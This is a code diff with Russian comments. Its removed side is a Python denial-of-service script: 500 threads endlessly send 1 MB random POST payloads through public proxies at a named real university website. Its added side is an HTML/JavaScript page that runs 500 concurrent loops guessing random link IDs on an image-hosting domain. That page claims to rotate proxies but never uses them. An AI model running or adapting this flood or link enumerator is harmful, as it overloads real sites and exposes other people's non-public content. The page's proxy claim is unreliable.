@@ -1,56 +1,127 @@
-import requests
-import threading
-import random
-import string
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Смена IP и проверка ссылок</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        ul {
+            margin-top: 20px;
+            list-style: none;
+            padding: 0;
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #ccc;
+        }
+        li {
+            margin: 5px 0;
+        }
+        .working {
+            color: green;
+            font-weight: bold;
+        }
+        .not-working {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1>Проверка ссылок с изменением IP</h1>
+    <button id="start">Начать проверку</button>
+    <button id="stop" disabled>Остановить</button>
+    <ul id="results"></ul>
 
-# URL вашего сайта
-url = "https://kaliningrad.mfua.ru/"
+    <script>
+        let isRunning = false;
+        const proxies = [
+            'http://200.55.249.135:80',    // Эквадор, Мачала
+            'https://182.53.245.241:443',  // Таиланд, Чантхабури
+            'socks4://213.197.136.218:1080', // Литва, Вильнюс
+            'socks5://23.227.199.108:1080', // США, Чикаго
+        ];
 
-# Список прокси-серверов
-proxy_list = [
-    "http://200.55.249.135:80",
-    "http://182.53.245.241:443",
-    "http://213.197.136.218:1080",
-    "http://23.227.199.108:1080",
-    "http://47.74.9.20:8080",
-]
-
-# Функция для генерации случайных данных
-def generate_large_data(size=1024 * 1024):  # 1 MB данных
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
-
-# Функция для отправки POST-запроса через прокси
-def send_post_request(thread_id):
-    while True:
-        try:
-            # Генерация больших данных
-            data = {"payload": generate_large_data()}
-            
-            # Выбор случайного прокси из списка
-            proxy = random.choice(proxy_list)
-            proxies = {
-                "http": proxy,
-                "https": proxy,
+        // Функция для генерации случайного идентификатора
+        function generateRandomId() {
+            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            let result = "GALL_";
+            for (let i = 0; i < 22; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
             }
-            
-            # Отправка POST-запроса
-            response = requests.post(url, data=data, proxies=proxies, timeout=10)
-            
-            # Логирование ответа
-            print(f"[Thread {thread_id}] Proxy: {proxy}, Status: {response.status_code}, Response: {response.text}")
-        except Exception as e:
-            print(f"[Thread {thread_id}] Proxy: {proxy}, Ошибка: {e}")
+            return result;
+        }
 
-# Количество потоков
-num_threads = 500
+        // Функция для отправки запроса с прокси
+        async function checkLinkWithProxy(url, proxy) {
+            try {
+                const response = await fetch(url, {
+                    method: 'HEAD',
+                    headers: {
+                        'Proxy-Authorization': 'Basic ' + btoa('user:password') // Для прокси, требующих авторизации
+                    }
+                });
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
+        }
 
-# Запуск потоков
-threads = []
-for i in range(num_threads):
-    thread = threading.Thread(target=send_post_request, args=(i,))
-    threads.append(thread)
-    thread.start()
+        // Проверка ссылки с выбором прокси
+        async function continuousCheckWithProxy(threadId) {
+            const results = document.getElementById("results");
 
-# Ожидание завершения потоков
-for thread in threads:
-    thread.join()
+            while (isRunning) {
+                const randomId = generateRandomId();
+                const url = `https://xxfot.com/${randomId}`;
+                const proxy = proxies[Math.floor(Math.random() * proxies.length)]; // Выбираем случайный прокси
+
+                const isValid = await checkLinkWithProxy(url, proxy);
+
+                const listItem = document.createElement("li");
+                listItem.textContent = `Thread ${threadId}: ${url}`;
+
+                if (isValid) {
+                    listItem.className = "working";
+                } else {
+                    listItem.className = "not-working";
+                }
+
+                results.appendChild(listItem);
+                results.scrollTop = results.scrollHeight; // Прокрутка вниз для новых ссылок
+            }
+        }
+
+        // Функция для запуска проверки
+        function startChecking() {
+            isRunning = true;
+            document.getElementById("start").disabled = true;
+            document.getElementById("stop").disabled = false;
+
+            // Запускаем 500 потоков с прокси
+            for (let i = 0; i < 500; i++) {
+                continuousCheckWithProxy(i);
+            }
+        }
+
+        // Остановка проверки
+        function stopChecking() {
+            isRunning = false;
+            document.getElementById("start").disabled = false;
+            document.getElementById("stop").disabled = true;
+        }
+
+        // Добавляем обработчики кнопок
+        document.getElementById("start").addEventListener("click", startChecking);
+        document.getElementById("stop").addEventListener("click", stopChecking);
+    </script>
+</body>
+</html>
